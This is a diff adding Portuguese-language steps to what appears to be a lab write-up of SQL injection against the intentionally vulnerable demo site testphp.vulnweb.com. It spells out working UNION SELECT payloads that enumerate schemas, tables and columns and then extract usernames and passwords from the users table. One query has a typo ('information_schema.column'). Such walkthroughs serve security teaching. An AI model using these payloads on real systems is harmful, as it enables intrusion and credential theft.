@@ -60,3 +60,36 @@ Seguindo a linha de testes, todas as informações de Dump também podem ser obt
     utilizando o caminho 
     
             testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,schema_name,3,4,5,6,7,8,9,10,11 from information_schema.schemata
+com este acesso conseguimos encontrar mais informações sobre o banco de dados onde conseguimos entender quantos bancos existem naquele esquema, onde precisaremos ir e compreender até onde o usuário padrão pode acessar nos registros.
+    ![image](https://github.com/user-attachments/assets/2c41debc-0ba3-4678-8ddf-b7361a846326)
+A partir deste ponto podemos ter acesso as Tabelas do banco de dados, seguindo a mesma logica mas agora com o seguinte comando
+
+        testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema.tables
+
+![image](https://github.com/user-attachments/assets/0a65175b-b636-46c1-b411-d07cc4a72e5b)
+
+O que nos revela todas as tabelas do banco de dados, com isso geramos um ruido de informação e para filtrar toda essa informação direcionando a busca agora que sabemos que o banco alvo se chama ACUART podemos direcionr com o comando
+
+    testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema.tables WHERE table_schema = "acuart"
+
+Nos trazendo informações mais precisas sobre as tabelas como podemos ver naimagem abaixo
+![image](https://github.com/user-attachments/assets/09ffeef9-d299-4b90-8c95-13344683dc21)
+
+Conhecendo o Banco, As tabelas agora podemos ir ao nome das Colunas baseados em nossos resultados, utilizamos os seguintes argumentos SQL
+
+        testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,column_name,3,4,5,6,7,8,9,10,11 from information_schema.columns WHERE table_schema = "acuart"
+O que nos retorna as informações de tabela do Banco como ID, Name, Phone, PASS, USER NAME etc, o próximo passo para chegarmos mais perto das informações seria lapidar novamente o que conseguimos extrair do banco de dados, acrescentando o table_name e filtrando por users
+
+        testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,column_name,3,4,5,6,7,8,9,10,11 from information_schema.column WHERE table_schema = "acuart" and table_name="users"
+
+![image](https://github.com/user-attachments/assets/e1c3ebca-05bf-4a8b-8163-19ca077eeb53)
+
+Agora que conseguimos as colunas podemos acessar as informações que buscamos desde o inicio como uname e pass para acessarmos o painel com usuário e senha, por fim podemos uutilizar o parametro uname from users para conseguir acesso as informações tanto da tabela uname quando da tabela pass
+
+        testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,uname,3,4,5,6,7,8,9,10,11 from users
+![image](https://github.com/user-attachments/assets/45b75270-9c21-412c-bf6d-831786c11288)
+e
+
+        testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,pass,3,4,5,6,7,8,9,10,11 from users
+![image](https://github.com/user-attachments/assets/d850e68b-2170-47cd-92bb-5198df1bc318)
+Finalizando assim a caçada aos dados pelo banco de dados, onde conseguimos obter as informações de acesso simplesmente inserindo queries SQL pois o site não recebeu tratamento em suas requisições permitindo que esta falha seja explorada.
